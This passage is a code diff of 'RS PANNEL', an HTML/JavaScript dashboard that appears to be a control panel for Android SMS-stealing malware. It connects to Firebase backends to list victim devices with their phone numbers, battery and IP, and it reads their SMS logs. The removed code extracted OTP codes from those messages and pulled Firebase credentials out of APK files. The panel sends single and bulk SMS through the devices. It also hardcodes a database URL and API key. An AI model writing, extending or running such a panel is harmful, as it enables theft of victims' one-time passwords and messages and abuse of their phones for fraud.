-      pointer-events:none;
-      white-space:nowrap;
+    .send-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:16px}
+    .send-grid .full{grid-column:1/-1}
+    .send-grid label{color:var(--dim);font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px}
+    .send-grid input,.send-grid textarea,.send-grid select{
+      width:100%;padding:10px 14px;background:var(--bg3);border:1px solid var(--border);border-radius:12px;color:var(--text);font-size:13px
     }
-    .toast.show { opacity:1; transform:translateX(-50%) translateY(0); }
-    .toast.error { border-color:rgba(255,59,48,0.3); color:var(--red); }
-    .toast.success { border-color:rgba(0,214,143,0.25); color:var(--green); }
+    .send-grid input:focus,.send-grid textarea:focus{border-color:var(--cyan)}
+    .send-grid textarea{resize:vertical;min-height:80px}
+    .send-grid .sim-toggle{display:flex;gap:10px}
+    .send-grid .sim-toggle button{
+      flex:1;padding:10px;border:1px solid var(--border);border-radius:12px;
+      background:var(--bg3);color:var(--muted);font-weight:700;font-size:13px;transition:.15s
+    }
+    .send-grid .sim-toggle button.active{border-color:var(--cyan);color:var(--cyan);background:rgba(24,191,255,0.06)}
+    .send-grid .sim-toggle button:hover{border-color:var(--border2)}
+    .send-btn{
+      width:100%;padding:14px;border:0;border-radius:14px;
+      background:linear-gradient(90deg,#ff3027,#df3a08);color:#fff;font-weight:700;font-size:15px;
+      box-shadow:0 8px 25px rgba(255,49,30,0.18);transition:.15s;margin-top:4px
+    }
+    .send-btn:hover{transform:translateY(-2px);box-shadow:0 12px 35px rgba(255,49,30,0.3)}
+    .send-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
+    .send-result{margin-top:14px;padding:12px 16px;border-radius:12px;font-size:13px;font-weight:600;display:none}
+    .send-result.ok{display:block;background:rgba(0,214,143,0.08);color:var(--green);border:1px solid rgba(0,214,143,0.15)}
+    .send-result.err{display:block;background:rgba(255,59,48,0.08);color:var(--red);border:1px solid rgba(255,59,48,0.15)}
 
-    @media (max-width:900px) { .grid { grid-template-columns:repeat(auto-fill, minmax(240px,1fr)); } }
-    @media (max-width:650px) {
-      .topbar { padding:0 14px; gap:10px; flex-wrap:wrap; height:auto; padding:12px 14px; }
-      .topbar .logo { font-size:14px; letter-spacing:1px; }
-      .topbar .search { max-width:100%; order:3; flex-basis:100%; }
-      .topbar .actions .status { display:none; }
-      .grid { grid-template-columns:1fr; padding:10px 14px 20px; }
-      .statsbar { padding:12px 14px; gap:16px; }
-      .filters { padding:10px 14px; }
-      .modal-box { padding:20px; }
-      .brand h1 { font-size:30px; }
-      .detail-grid { grid-template-columns:1fr; }
-      .send-grid { grid-template-columns:1fr; }
-      .send-grid .full { grid-column:1; }
-      .toast { white-space:normal; max-width:90%; text-align:center; }
-      .form-group .apk-upload { flex-direction:column; align-items:stretch; }
+    .toast{
+      position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(20px);
+      background:var(--bg3);border:1px solid var(--border2);padding:12px 28px;border-radius:16px;
+      color:var(--text);font-size:13px;font-weight:600;z-index:99999;
+      box-shadow:0 18px 60px rgba(0,0,0,0.6);backdrop-filter:blur(12px);
+      opacity:0;transition:all .3s cubic-bezier(.34,1.56,.64,1);pointer-events:none;white-space:nowrap
+    }
+    .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+    .toast.error{border-color:rgba(255,59,48,0.3);color:var(--red)}
+    .toast.success{border-color:rgba(0,214,143,0.25);color:var(--green)}
+
+    /* ─── RESPONSIVE ──────────────────────────────────────── */
+    @media(max-width:900px){.grid{grid-template-columns:repeat(auto-fill,minmax(240px,1fr))}}
+    @media(max-width:650px){
+      .topbar{padding:0 14px;gap:10px;flex-wrap:wrap;height:auto;padding:12px 14px}
+      .topbar .logo{font-size:14px;letter-spacing:1px}
+      .topbar .search{max-width:100%;order:3;flex-basis:100%}
+      .topbar .actions .status{display:none}
+      .grid{grid-template-columns:1fr;padding:10px 14px 20px}
+      .statsbar{padding:12px 14px;gap:16px}
+      .filters{padding:10px 14px}
+      .modal-box{padding:20px}
+      .brand h1{font-size:30px}
+      .detail-grid{grid-template-columns:1fr}
+      .send-grid{grid-template-columns:1fr}
+      .send-grid .full{grid-column:1}
+      .toast{white-space:normal;max-width:90%;text-align:center}
     }
   </style>
 </head>
 <body>
 
+<!-- ─── TOAST ────────────────────────────────────────────────────────── -->
 <div id="toast" class="toast"></div>
 
-<!-- HOME -->
+<!-- ─── HOME SCREEN ──────────────────────────────────────────────────── -->
 <section id="homeScreen" class="screen">
   <div class="shell">
     <div class="brand">
@@ -651,29 +306,17 @@
       <button class="btn-new" id="newConnBtn">＋ New Firebase Connection</button>
       <div id="homeError" class="error-text hidden"></div>
     </div>
-    <div class="footer-text">RS PANNEL · v5.0 · Telegram @RSPANNEL</div>
+    <div class="footer-text">RS PANNEL · v4.0 · Telegram @RSPANNEL</div>
   </div>
 </section>
 
-<!-- SETUP -->
+<!-- ─── SETUP SCREEN ─────────────────────────────────────────────────── -->
 <section id="setupScreen" class="screen hidden">
   <div class="shell">
     <div class="brand"><h1>RS <span>PANNEL</span></h1><p>Add Firebase Project</p></div>
     <div class="card form-card">
       <button class="back" id="backBtn">‹</button>
       <div class="title">New Firebase Connection</div>
-
-      <div class="form-group">
-        <label>📦 Extract from APK (Optional)</label>
-        <div class="apk-upload">
-          <input type="file" id="apkFileInput" accept=".apk" />
-          <label class="file-label" for="apkFileInput">Choose APK</label>
-          <span class="file-status" id="apkStatus">No file selected</span>
-          <button class="extract-btn" id="extractBtn">Extract</button>
-        </div>
-        <div style="font-size:11px;color:var(--dim);margin-top:6px;">Upload APK to auto‑extract Firebase URL &amp; API Key from google-services.json</div>
-      </div>
-
       <div class="form-group">
         <label>Friendly Label</label>
         <input id="labelInput" placeholder="e.g. My Project" value="Pikachu" />
@@ -686,7 +329,6 @@
         <label>Web API Key</label>
         <input id="keyInput" type="password" placeholder="AIza..." value="AIzaSyCvVqCRv7qZQwYxItXwj8Nj1s4gFmpZ2I" />
       </div>
-
       <div class="form-actions">
         <button class="primary" id="saveConnBtn">⚡ Connect</button>
         <button class="secondary" id="cancelBtn">Cancel</button>
@@ -697,16 +339,14 @@
   </div>
 </section>
 
-<!-- DASHBOARD -->
+<!-- ─── DASHBOARD ────────────────────────────────────────────────────── -->
 <section id="dashboardScreen" class="dashboard">
   <header class="topbar">
     <div class="logo"><div class="dot">RS</div> RS PANNEL</div>
     <div class="search"><input id="searchInput" placeholder="Search devices..." /></div>
     <div class="actions">
       <span class="status" id="statusLabel">● Connected</span>
-      <a class="telegram" href="https://t.me/RSPANNEL" target="_blank" rel="noopener">
-        <svg viewBox="0 0 24 24"><path d="M21.5 3.5 18.3 20c-.2 1.2-.9 1.5-1.8.9l-5-3.7-2.4 2.3c-.3.3-.5.5-1 .5l.4-5.1 9.3-8.4c.4-.4-.1-.6-.6-.2L5.7 13.7.8 12.2c-1.1-.3-1.1-1.1.2-1.6L20.2 4c.9-.3 1.7.2 1.3-.5z"/></svg>
-      </a>
+      <a class="telegram" href="https://t.me/RSPANNEL" target="_blank"><svg viewBox="0 0 24 24"><path d="M21.5 3.5 18.3 20c-.2 1.2-.9 1.5-1.8.9l-5-3.7-2.4 2.3c-.3.3-.5.5-1 .5l.4-5.1 9.3-8.4c.4-.4-.1-.6-.6-.2L5.7 13.7.8 12.2c-1.1-.3-1.1-1.1.2-1.6L20.2 4c.9-.3 1.7.2 1.3-.5z"/></svg></a>
       <button class="btn-icon" id="refreshBtn" title="Refresh">↻</button>
       <button class="btn-icon" id="bulkBtn" title="Bulk SMS">📨</button>
       <button class="logout" id="logoutBtn">Exit</button>
@@ -716,633 +356,600 @@
   <div class="statsbar">
     <div class="stat-item"><small>Total</small><strong id="totalStat">0</strong></div>
     <div class="stat-item"><small>Online</small><strong class="green" id="onlineStat">0</strong></div>
-    <div class="stat-item"><small>Offline</small><strong id="offlineStat">0</strong></div>
-    <div class="stat-item"><small>SMS</small><strong class="cyan" id="smsStat">0</strong></div>
+    <div class="stat-item"><small>Offline</small><strong class="red" id="offlineStat">0</strong></div>
+    <div class="stat-item"><small>Battery</small><strong class="cyan" id="batteryStat">—</strong></div>
   </div>
 
   <div class="filters">
     <button class="filter active" data-filter="all">All</button>
     <button class="filter" data-filter="online">Online</button>
     <button class="filter" data-filter="offline">Offline</button>
-    <button class="sort" id="sortBtn">Sort ▲</button>
+    <button class="sort" id="sortBtn">Sort: Newest</button>
   </div>
 
-  <main class="grid" id="deviceGrid"></main>
+  <div class="grid" id="deviceGrid">
+    <div class="empty-grid">Loading devices…</div>
+  </div>
 </section>
 
-<!-- DETAIL MODAL -->
-<div id="detailModal" class="modal-overlay">
+<!-- ─── DETAIL MODAL ──────────────────────────────────────────────────── -->
+<div class="modal-overlay" id="detailModal">
   <div class="modal-box">
     <div class="modal-header">
       <h2 id="detailDeviceName">Device</h2>
-      <button class="close" id="detailClose">×</button>
+      <button class="close" id="closeDetailModal">&times;</button>
     </div>
     <div class="detail-grid" id="detailGrid"></div>
     <div class="sms-section">
-      <h3>📩 SMS Logs <span id="smsCountBadge" style="color:var(--cyan);font-size:12px;"></span></h3>
-      <div id="detailSmsList"></div>
+      <h3>📩 Messages</h3>
+      <div id="messageList"></div>
     </div>
-  </div>
-</div>
-
-<!-- SEND MODAL -->
-<div id="sendModal" class="modal-overlay">
-  <div class="modal-box" style="max-width:540px;">
-    <div class="modal-header">
-      <h2>📡 Send SMS</h2>
-      <button class="close" id="sendClose">×</button>
-    </div>
+    <hr style="border-color:var(--border);margin:20px 0" />
     <div class="send-grid">
       <div class="full">
-        <label>Target Device</label>
-        <select id="sendDeviceSelect"></select>
-      </div>
-      <div class="full">
-        <label>Recipient Number</label>
-        <input id="sendNumber" placeholder="+919876543210" />
-      </div>
-      <div class="full">
-        <label>SIM Slot</label>
+        <label>Send SMS</label>
         <div class="sim-toggle">
-          <button id="sendSim1" data-sim="0" class="active">SIM 1</button>
-          <button id="sendSim2" data-sim="1">SIM 2</button>
+          <button class="active" data-sim="1">SIM 1</button>
+          <button data-sim="2">SIM 2</button>
         </div>
       </div>
       <div class="full">
-        <label>Message</label>
-        <textarea id="sendMessage" placeholder="Type your message..."></textarea>
+        <input id="smsTo" placeholder="Recipient number" />
+      </div>
+      <div class="full">
+        <textarea id="smsBody" placeholder="Message text..."></textarea>
+      </div>
+      <div class="full">
+        <button class="send-btn" id="sendSmsBtn">📤 Send SMS</button>
+        <div class="send-result" id="sendResult"></div>
       </div>
     </div>
-    <button class="send-btn" id="sendBtn">🚀 Send</button>
-    <div class="send-result" id="sendResult"></div>
   </div>
 </div>
 
-<!-- BULK MODAL -->
-<div id="bulkModal" class="modal-overlay">
-  <div class="modal-box" style="max-width:540px;">
+<!-- ─── BULK MODAL ────────────────────────────────────────────────────── -->
+<div class="modal-overlay" id="bulkModal">
+  <div class="modal-box" style="max-width:600px">
     <div class="modal-header">
       <h2>📨 Bulk SMS</h2>
-      <button class="close" id="bulkClose">×</button>
+      <button class="close" id="closeBulkModal">&times;</button>
     </div>
-    <div style="margin-bottom:14px;font-size:13px;color:var(--muted);">
-      Sending to <span id="bulkCount" style="color:var(--green);font-weight:700;">0</span> online devices
-    </div>
+    <p style="color:var(--muted);margin-bottom:12px">Select devices to send SMS</p>
+    <div id="bulkDeviceList" style="max-height:200px;overflow-y:auto;border:1px solid var(--border);border-radius:12px;padding:8px 12px;margin-bottom:16px"></div>
     <div class="send-grid">
       <div class="full">
-        <label>Recipient Number</label>
-        <input id="bulkNumber" placeholder="+919876543210" />
-      </div>
-      <div class="full">
-        <label>SIM Slot</label>
-        <div class="sim-toggle">
-          <button id="bulkSim1" data-sim="0" class="active">SIM 1</button>
-          <button id="bulkSim2" data-sim="1">SIM 2</button>
-        </div>
-      </div>
-      <div class="full">
         <label>Message</label>
-        <textarea id="bulkMessage" placeholder="Message for all online devices..."></textarea>
+        <textarea id="bulkMsg" placeholder="Message..." style="min-height:60px"></textarea>
+      </div>
+      <div class="full">
+        <button class="send-btn" id="bulkSendBtn">📤 Send to Selected</button>
+        <div class="send-result" id="bulkResult"></div>
       </div>
     </div>
-    <button class="send-btn" id="bulkSendBtn">🚀 Send to All Online</button>
-    <div class="send-result" id="bulkResult"></div>
   </div>
 </div>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
 <script>
-  // ─── SECURE STORAGE ──────────────────────────────────────────────────
-  const STORAGE_KEY = 'rs_pannel_conns';
-  function getPass() {
-    if (!window._sp) window._sp = Math.random().toString(36).slice(2,15) + Math.random().toString(36).slice(2,15);
-    return window._sp;
-  }
-  function enc(t,p) { let r=''; for(let i=0;i<t.length;i++) r+=String.fromCharCode(t.charCodeAt(i)^p.charCodeAt(i%p.length)); return btoa(r); }
-  function dec(e,p) { try { const d=atob(e); let r=''; for(let i=0;i<d.length;i++) r+=String.fromCharCode(d.charCodeAt(i)^p.charCodeAt(i%p.length)); return r; } catch { return null; } }
-  function saveConns(data) { try { sessionStorage.setItem(STORAGE_KEY, enc(JSON.stringify(data), getPass())); } catch(e){} }
-  function loadConns() { try { const e=sessionStorage.getItem(STORAGE_KEY); if(!e) return {connections:[]}; const d=dec(e, getPass()); if(!d) return {connections:[]}; return JSON.parse(d); } catch { return {connections:[]}; } }
+  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  //  CORE LOGIC — Merged from Medline Panel
+  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-  // ─── HELPERS ──────────────────────────────────────────────────────────
+  // ─── STATE ──────────────────────────────────────────────────────────
+  let CONNECTIONS = JSON.parse(localStorage.getItem('rs_connections') || '[]');
+  let activeConn = null;          // { label, url, key }
+  let allDevices = [];
+  let filterMode = 'all';
+  let searchQuery = '';
+  let selectedDevice = null;
+  let messageCache = {};          // deviceId -> messages[]
+  let simChoice = 1;
+  let pollTimer = null;
+
+  // ─── DOM REFS ──────────────────────────────────────────────────────
   const $ = id => document.getElementById(id);
-  function showToast(msg, type='success', dur=2000) {
-    const t = $('toast');
-    t.textContent = msg;
-    t.className = `toast ${type}`;
-    void t.offsetWidth;
-    t.classList.add('show');
-    clearTimeout(t._hide);
-    t._hide = setTimeout(() => t.classList.remove('show'), dur);
-  }
-  function esc(str) { if(!str) return ''; return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
-  function extractOTP(text) { if(!text) return null; const m = text.match(/\b\d{4,8}\b/g); if(m) return m.sort((a,b)=>a.length-b.length)[0]; return null; }
+  const homeScreen = $('homeScreen');
+  const setupScreen = $('setupScreen');
+  const dashboardScreen = $('dashboardScreen');
+  const connectionsList = $('connectionsList');
+  const connCount = $('connCount');
+  const homeError = $('homeError');
+  const setupError = $('setupError');
+  const deviceGrid = $('deviceGrid');
+  const searchInput = $('searchInput');
+  const statusLabel = $('statusLabel');
+  const totalStat = $('totalStat');
+  const onlineStat = $('onlineStat');
+  const offlineStat = $('offlineStat');
+  const batteryStat = $('batteryStat');
 
-  // ─── NAVIGATION ──────────────────────────────────────────────────────
+  // Modals
+  const detailModal = $('detailModal');
+  const closeDetail = $('closeDetailModal');
+  const detailGrid = $('detailGrid');
+  const messageList = $('messageList');
+  const smsTo = $('smsTo');
+  const smsBody = $('smsBody');
+  const sendSmsBtn = $('sendSmsBtn');
+  const sendResult = $('sendResult');
+
+  const bulkModal = $('bulkModal');
+  const closeBulk = $('closeBulkModal');
+  const bulkDeviceList = $('bulkDeviceList');
+  const bulkMsg = $('bulkMsg');
+  const bulkSendBtn = $('bulkSendBtn');
+  const bulkResult = $('bulkResult');
+
+  // ─── TOAST ──────────────────────────────────────────────────────────
+  function toast(msg, type = 'success') {
+    const el = $('toast');
+    el.textContent = msg;
+    el.className = 'toast ' + type + ' show';
+    clearTimeout(el._hide);
+    el._hide = setTimeout(() => el.classList.remove('show'), 3000);
+  }
+
+  // ─── SCREEN NAVIGATION ────────────────────────────────────────────
   function showHome() {
-    if(window._unsub) { try { window._unsub(); } catch(e){} window._unsub = null; }
-    $('setupScreen').classList.add('hidden');
-    $('dashboardScreen').style.display = 'none';
-    $('homeScreen').classList.remove('hidden');
+    homeScreen.classList.remove('hidden');
+    setupScreen.classList.add('hidden');
+    dashboardScreen.style.display = 'none';
     renderConnections();
   }
-  function showSetup() {
-    $('homeScreen').classList.add('hidden');
-    $('dashboardScreen').style.display = 'none';
-    $('setupScreen').classList.remove('hidden');
-    $('setupError').classList.add('hidden');
-    $('apkStatus').textContent = 'No file selected';
-    $('apkFileInput').value = '';
-  }
-  function showDashboard() {
-    $('homeScreen').classList.add('hidden');
-    $('setupScreen').classList.add('hidden');
-    $('dashboardScreen').style.display = 'block';
+
+  function showSetup(editConn = null) {
+    homeScreen.classList.add('hidden');
+    setupScreen.classList.remove('hidden');
+    dashboardScreen.style.display = 'none';
+    if (editConn) {
+      $('labelInput').value = editConn.label || '';
+      $('urlInput').value = editConn.url || '';
+      $('keyInput').value = editConn.key || '';
+    } else {
+      $('labelInput').value = 'Pikachu';
+      $('urlInput').value = 'https://admin-no-43-default-rtdb.firebaseio.com';
+      $('keyInput').value = 'AIzaSyCvVqCRv7qZQwYxItXwj8Nj1s4gFmpZ2I';
+    }
+    setupError.classList.add('hidden');
   }
 
-  // ─── CONNECTIONS ──────────────────────────────────────────────────────
+  function showDashboard() {
+    homeScreen.classList.add('hidden');
+    setupScreen.classList.add('hidden');
+    dashboardScreen.style.display = 'block';
+    refreshDevices();
+    startPolling();
+  }
+
+  // ─── CONNECTIONS ──────────────────────────────────────────────────
   function renderConnections() {
-    const local = loadConns();
-    const list = local.connections || [];
-    $('connCount').textContent = list.length;
-    const container = $('connectionsList');
-    container.innerHTML = '';
-    if(!list.length) {
-      container.innerHTML = '<div style="text-align:center;color:var(--muted);padding:20px 0;font-size:14px;">No saved connections</div>';
+    if (!connectionsList) return;
+    if (CONNECTIONS.length === 0) {
+      connectionsList.innerHTML = `<div style="color:var(--muted);padding:12px;text-align:center">No connections saved.</div>`;
+      connCount.textContent = '0';
       return;
     }
-    list.forEach((c,i) => {
-      const div = document.createElement('div');
-      div.className = 'conn-item';
-      div.innerHTML = `
+    connCount.textContent = CONNECTIONS.length;
+    connectionsList.innerHTML = CONNECTIONS.map((c, i) => `
+      <div class="conn-item">
         <div class="info">
-          <div class="name">${esc(c.label || 'Firebase Project')}</div>
-          <div class="date">${new Date(c.created || Date.now()).toLocaleString()}</div>
+          <div class="name">${esc(c.label)}</div>
+          <div class="date">${c.url}</div>
         </div>
-        <button class="connect" data-index="${i}">↗</button>
-        <button class="del" data-index="${i}">⌫</button>
-      `;
-      div.querySelectorAll('button').forEach(btn => {
-        btn.addEventListener('click', function(e) {
-          e.stopPropagation();
-          const idx = parseInt(this.dataset.index);
-          const localData = loadConns();
-          if(this.classList.contains('connect')) {
-            connectSecure(localData.connections[idx]);
-          } else {
-            localData.connections.splice(idx,1);
-            saveConns(localData);
-            renderConnections();
-            showToast('Removed','success');
-          }
-        });
-      });
-      container.appendChild(div);
-    });
-  }
-
-  // ─── APK EXTRACTION ──────────────────────────────────────────────────
-  let extractedUrl = '', extractedKey = '';
-
-  $('apkFileInput').addEventListener('change', function(e) {
-    const file = this.files[0];
-    if(file) {
-      $('apkStatus').textContent = file.name + ' (' + (file.size/1024).toFixed(1) + ' KB)';
-      $('extractBtn').disabled = false;
-    } else {
-      $('apkStatus').textContent = 'No file selected';
-      $('extractBtn').disabled = true;
-    }
-  });
-
-  $('extractBtn').addEventListener('click', async function() {
-    const input = $('apkFileInput');
-    const file = input.files[0];
-    if(!file) { showToast('Select an APK first','error'); return; }
-
-    this.disabled = true;
-    this.textContent = '⏳ Extracting...';
-    $('apkStatus').textContent = 'Reading APK...';
-
-    try {
-      const arrayBuffer = await file.arrayBuffer();
-      const zip = await JSZip.loadAsync(arrayBuffer);
-
-      let jsonFile = zip.file('google-services.json');
-      if(!jsonFile) {
-        const possible = ['google-services.json', 'res/raw/google-services.json', 'assets/google-services.json'];
-        for(const p of possible) {
-          const f = zip.file(p);
-          if(f) { jsonFile = f; break; }
+        <button class="connect" data-idx="${i}" title="Connect">▶</button>
+        <button class="del" data-idx="${i}" title="Delete">✕</button>
+      </div>
+    `).join('');
+    // Event listeners for connect/delete
+    connectionsList.querySelectorAll('.connect').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const idx = parseInt(btn.dataset.idx);
+        const conn = CONNECTIONS[idx];
+        if (conn) {
+          activeConn = conn;
+          showDashboard();
+          toast('Connected to ' + conn.label, 'success');
         }
-      }
-      if(!jsonFile) {
-        showToast('google-services.json not found', 'error');
-        this.textContent = 'Extract';
-        this.disabled = false;
-        $('apkStatus').textContent = 'No google-services.json found';
-        return;
-      }
-
-      const content = await jsonFile.async('string');
-      const config = JSON.parse(content);
-      let dbUrl = '', apiKey = '';
-      if(config.project_info && config.project_info.firebase_url) dbUrl = config.project_info.firebase_url;
-      if(config.client && config.client.length > 0) {
-        const client = config.client[0];
-        if(client.api_key && client.api_key.length > 0) apiKey = client.api_key[0].current_key || '';
-      }
-      if(!dbUrl || !apiKey) {
-        showToast('Could not extract both URL and API key', 'error');
-        this.textContent = 'Extract';
-        this.disabled = false;
-        $('apkStatus').textContent = 'Incomplete config';
-        return;
-      }
-
-      $('urlInput').value = dbUrl;
-      $('keyInput').value = apiKey;
-      extractedUrl = dbUrl; extractedKey = apiKey;
-      $('apkStatus').textContent = '✅ Extracted successfully!';
-      showToast('Firebase credentials extracted!', 'success');
-    } catch(e) {
-      console.error(e);
-      showToast('Extraction failed: ' + e.message, 'error');
-      $('apkStatus').textContent = 'Error: ' + e.message;
-    } finally {
-      this.textContent = 'Extract';
-      this.disabled = false;
-    }
-  });
-
-  // ─── FIREBASE CONNECTION ─────────────────────────────────────────────
-  let firebaseReady = false;
-  let devices = [], allMessages = [];
-  let currentFilter = 'all', sortAsc = false;
-  let selectedSim = 0;
-
-  function connectSecure(conn) {
-    try {
-      const apiKey = dec(conn.apiKey, getPass());
-      if(!apiKey) { showToast('Decryption failed','error'); return; }
-      showDashboard();
-      const status = $('statusLabel');
-      status.textContent = '● Loading...';
-      status.style.color = 'var(--yellow)';
-
-      if(!firebaseReady) {
-        const script = document.createElement('script');
-        script.src = 'https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js';
-        script.onload = () => {
-          const dbScript = document.createElement('script');
-          dbScript.src = 'https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js';
-          dbScript.onload = () => {
-            firebaseReady = true;
-            initFirebase(conn, apiKey);
-          };
-          document.head.appendChild(dbScript);
-        };
-        script.onerror = () => { showToast('Failed to load Firebase SDK','error'); status.textContent='● Error'; status.style.color='var(--danger)'; };
-        document.head.appendChild(script);
-      } else {
-        initFirebase(conn, apiKey);
-      }
-    } catch(e) { console.error(e); showToast('Connection error: '+e.message,'error'); }
+      });
+    });
+    connectionsList.querySelectorAll('.del').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const idx = parseInt(btn.dataset.idx);
+        if (confirm('Delete connection "' + CONNECTIONS[idx].label + '"?')) {
+          CONNECTIONS.splice(idx, 1);
+          localStorage.setItem('rs_connections', JSON.stringify(CONNECTIONS));
+          renderConnections();
+          toast('Deleted', 'error');
+        }
+      });
+    });
   }
 
-  function initFirebase(conn, apiKey) {
+  // ─── FIREBASE HELPERS ─────────────────────────────────────────────
+  function fbUrl(path) {
+    return activeConn.url + '/' + path + '.json' + (activeConn.key ? '?auth=' + activeConn.key : '');
+  }
+
+  async function fbGet(path) {
+    const res = await fetch(fbUrl(path));
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    return res.json();
+  }
+
+  async function fbSet(path, data) {
+    const res = await fetch(fbUrl(path), {
+      method: 'PUT',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    });
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    return res.json();
+  }
+
+  // ─── PARSE DEVICES ────────────────────────────────────────────────
+  function parseDevices(data) {
+    if (!data || typeof data !== 'object') return [];
+    return Object.keys(data).map(id => {
+      const d = data[id];
+      return {
+        id,
+        name: d.name || d.deviceName || id,
+        phone: d.mobNo || d.phone || '',
+        battery: d.batteryNum || d.battery || 0,
+        status: d.status === true || d.online === true,
+        note: d.note || d.notes || '',
+        sims: d.sims || [],
+        batteryRaw: d.batteryRaw || null,
+        android: d.android || '',
+        ip: d.ip || '',
+        joined: d.joined || '',
+        ...d
+      };
+    });
+  }
+
+  // ─── REFRESH DEVICES ──────────────────────────────────────────────
+  async function refreshDevices() {
+    if (!activeConn) return;
     try {
-      if(window._unsub) { try { window._unsub(); } catch(e){} window._unsub = null; }
-      if(firebase.apps.length) firebase.apps.forEach(app => app.delete());
-      firebase.initializeApp({ apiKey, databaseURL: conn.databaseURL });
-      const db = firebase.database();
-      const status = $('statusLabel');
-
-      let deviceCache = {}, messagesCache = {};
-      let deviceLoaded = false, msgLoaded = false;
-
-      const clientsRef = db.ref('clients');
-      clientsRef.on('value', snap => {
-        deviceCache = snap.val() || {};
-        deviceLoaded = true;
-        buildRecords();
-      }, err => {
-        console.warn('Clients error:', err);
-        db.ref('devices').once('value', s => {
-          if(s.exists()) { deviceCache = s.val() || {}; deviceLoaded = true; buildRecords(); }
-        });
-      });
-
-      const msgRef = db.ref('messages');
-      msgRef.on('value', snap => {
-        messagesCache = snap.val() || {};
-        msgLoaded = true;
-        buildRecords();
-      }, err => {
-        console.warn('Messages error:', err);
-        setTimeout(() => {
-          if(!msgLoaded) {
-            fetch(`${conn.databaseURL}/messages.json${apiKey ? '?auth='+apiKey : ''}`)
-              .then(res => res.json())
-              .then(data => { if(data) { messagesCache = data; msgLoaded = true; buildRecords(); } })
-              .catch(() => {});
-          }
-        }, 2000);
-      });
-
-      function buildRecords() {
-        if(!deviceLoaded || !msgLoaded) return;
-        const msgs = Object.values(messagesCache).filter(m => m && typeof m === 'object');
-        allMessages = msgs;
-
-        devices = Object.entries(deviceCache).map(([id, node]) => {
-          const number = (node.number || node.phoneNumber || node.phone || '').toString().trim();
-          const deviceSms = msgs.filter(s => {
-            const sender = (s.sender || s.from || s.number || '').toString().trim();
-            return number && sender && (sender.includes(number) || number.includes(sender));
-          });
-          return {
-            id,
-            name: node.name || node.deviceName || node.label || id,
-            online: node.online === true || node.status === true,
-            platform: node.platform || node.os || node.model || 'Android',
-            number: number || 'N/A',
-            network: node.network || node.carrier || node.operator || 'N/A',
-            lastSeen: node.lastSeen || node.lastMessageTime || node.timestamp || Date.now(),
-            battery: node.battery || node.batteryLevel || 'N/A',
-            ip: node.ip || node.ipAddress || 'N/A',
-            android: node.android || node.androidVersion || 'N/A',
-            sim1: node.sim1 || node.simSlot1 || '',
-            sim2: node.sim2 || node.simSlot2 || '',
-            sms: deviceSms,
-            _raw: node
-          };
-        });
-
-        renderGrid();
-        const totalSms = devices.reduce((sum,d) => sum + d.sms.length, 0);
-        $('smsStat').textContent = totalSms;
-        status.textContent = '● Connected';
-        status.style.color = 'var(--green)';
-        showToast(`✅ ${devices.length} devices, ${totalSms} SMS`, 'success', 1500);
-        populateSendSelect();
-      }
-
-      window._unsub = () => { clientsRef.off(); msgRef.off(); };
-    } catch(e) {
-      console.error(e);
-      showToast('Firebase init failed: '+e.message,'error');
-      $('statusLabel').textContent = '● Error';
-      $('statusLabel').style.color = 'var(--danger)';
+      const data = await fbGet('clients');
+      allDevices = parseDevices(data);
+      renderDeviceGrid();
+      updateStats();
+    } catch (e) {
+      toast('Failed to fetch devices: ' + e.message, 'error');
     }
   }
 
-  // ─── SAVE CONNECTION ─────────────────────────────────────────────────
-  $('saveConnBtn').addEventListener('click', () => {
-    const label = $('labelInput').value.trim() || 'Firebase Project';
-    const url = $('urlInput').value.trim().replace(/\/$/,'');
-    const key = $('keyInput').value.trim();
-    const err = $('setupError');
-    err.classList.add('hidden');
-    if(!url || !key) { err.textContent = 'Database URL and API Key required.'; err.classList.remove('hidden'); showToast('Missing credentials','error'); return; }
-    const conn = { label, databaseURL: url, apiKey: enc(key, getPass()), created: Date.now() };
-    const local = loadConns();
-    local.connections = local.connections.filter(c => c.databaseURL !== url);
-    local.connections.unshift(conn);
-    saveConns(local);
-    connectSecure(conn);
-  });
+  // ─── RENDER DEVICE GRID ───────────────────────────────────────────
+  function renderDeviceGrid() {
+    const q = searchQuery.toLowerCase().trim();
+    let filtered = allDevices;
+    if (filterMode === 'online') filtered = filtered.filter(d => d.status);
+    else if (filterMode === 'offline') filtered = filtered.filter(d => !d.status);
+    if (q) filtered = filtered.filter(d => d.name.toLowerCase().includes(q) || d.id.toLowerCase().includes(q) || (d.phone && d.phone.includes(q)));
 
-  // ─── EVENTS ──────────────────────────────────────────────────────────
-  $('newConnBtn').addEventListener('click', showSetup);
-  $('backBtn').addEventListener('click', showHome);
-  $('cancelBtn').addEventListener('click', showHome);
-  $('logoutBtn').addEventListener('click', showHome);
-  $('refreshBtn').addEventListener('click', () => {
-    const local = loadConns();
-    if(local.connections.length) connectSecure(local.connections[0]);
-    else showToast('No active connection','error');
-  });
+    if (filtered.length === 0) {
+      deviceGrid.innerHTML = `<div class="empty-grid">No devices found.</div>`;
+      return;
+    }
 
-  // ─── MODALS ──────────────────────────────────────────────────────────
-  $('detailClose').addEventListener('click', () => $('detailModal').classList.remove('active'));
-  $('detailModal').addEventListener('click', function(e) { if(e.target === this) this.classList.remove('active'); });
-  $('sendClose').addEventListener('click', () => $('sendModal').classList.remove('active'));
